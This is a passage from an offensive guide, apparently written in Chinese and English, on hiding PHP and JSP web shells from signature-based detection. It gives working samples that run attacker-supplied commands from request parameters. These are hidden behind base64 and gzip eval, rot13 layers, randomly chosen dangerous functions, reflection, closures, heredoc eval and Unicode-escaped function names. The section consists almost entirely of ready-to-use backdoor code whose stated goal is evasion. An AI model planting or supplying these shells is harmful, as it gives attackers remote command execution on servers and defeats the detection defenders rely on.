### 1.4 Code Compression and Minification

Strip whitespace, newlines, and comments to reduce signature surface area. Compress the code to a single line.

**PHP Example — One-liner:**

```php
<?php $x=$_REQUEST['x'];if($x){@call_user_func(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116),base64_decode($x));}?>
```

**PHP Example — Gzip compressed eval:**

```php
<?php eval(gzinflate(base64_decode('S03OyFdQSyzNKVFIyy9S8MsvUijJzEktLlFIy89XKMpPUkjLz8xNBQAhfg1n'))); ?>
```

**PHP Example — Multi-layer compressed:**

```php
<?php
// Layer 1: base64 -> Layer 2: gzinflate -> Layer 3: str_rot13 -> eval
eval(str_rot13(gzinflate(base64_decode('ENCODED_STRING'))));
?>
```

### 1.5 Function Name Randomization

Use PHP dynamic function features to call dangerous functions by random names.

**PHP Example — callback array:**

```php
<?php
$funcs = ['system', 'exec', 'passthru', 'shell_exec', 'popen', 'proc_open'];
$idx = array_rand($funcs);
$f = $funcs[$idx];
$f($_POST['cmd']);
?>
```

**PHP Example — Reflection API:**

```php
<?php
$ref = new ReflectionFunction('system');
$ref->invoke($_POST['cmd']);
?>
```

**PHP Example — anonymous function / closure:**

```php
<?php
$f = function($cmd) {
    return `$cmd 2>&1`;
};
echo $f($_POST['cmd']);
?>
```

**JSP Example — Reflection-based execution:**

```java
<%@ page import="java.lang.reflect.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Class rt = Class.forName("java.lang.Runtime");
    Method m = rt.getMethod("exec", String.class);
    Process p = (Process) m.invoke(rt.getMethod("getRuntime").invoke(null), cmd);
    java.io.InputStream in = p.getInputStream();
    int a;
    while ((a = in.read()) != -1) out.write(a);
}
%>
```

### 1.6 Heredoc / Nowdoc Obfuscation

**PHP Example — Heredoc masking:**

```php
<?php
$code = <<<CODE
\$x = \$_REQUEST['x'];
if(\$x) { eval(\$x); }
CODE;
eval($code);
?>
```

### 1.7 Unicode / UTF-8 Homoglyph Attacks

Replace ASCII characters in function names with visually similar Unicode characters that PHP may normalize.

**PHP Example:**

```php
<?php
// Use Unicode fullwidth characters or lookalike characters
// This relies on specific PHP version behavior with Unicode identifiers
// Note: PHP 7+ has restricted this significantly
// PHP 8+ Unicode identifiers are even more restricted
$f = "\u{0061}\u{0073}\u{0073}\u{0065}\u{0072}\u{0074}"; // assert
$f($_POST['cmd']);
?>
```

---



---
📖 本切片 2/2 结束。 本章节结束。